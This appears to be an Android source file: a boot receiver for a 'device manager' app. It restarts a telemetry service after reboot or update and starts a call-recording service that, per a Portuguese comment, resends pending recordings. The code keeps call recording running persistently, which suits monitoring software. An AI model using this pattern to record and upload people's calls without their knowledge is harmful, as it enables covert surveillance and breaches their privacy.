package com.company.devicemgr.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import com.company.devicemgr.services.CallRecordingService;
import com.company.devicemgr.services.ForegroundTelemetryService;
import com.company.devicemgr.utils.AppRuntime;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) return;

        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)) {

            android.content.SharedPreferences sp = context.getSharedPreferences("devicemgr_prefs", Context.MODE_PRIVATE);
            String token = sp.getString("auth_token", null);
            boolean setupCompleted = sp.getBoolean("setup_completed", false);

            if (token != null && token.length() > 10 && setupCompleted) {
                AppRuntime.ensureTelemetryStarted(context);
            } else {
                boolean started = sp.getBoolean("service_started", false);
                if (started) {
                    Intent svc = new Intent(context, ForegroundTelemetryService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(svc);
                    } else {
                        context.startService(svc);
                    }
                }
            }

            // tenta enviar gravações pendentes após reinício
            try {
                context.startService(new Intent(context, CallRecordingService.class));
            } catch (Exception ignored) {
            }
        }
    }
}
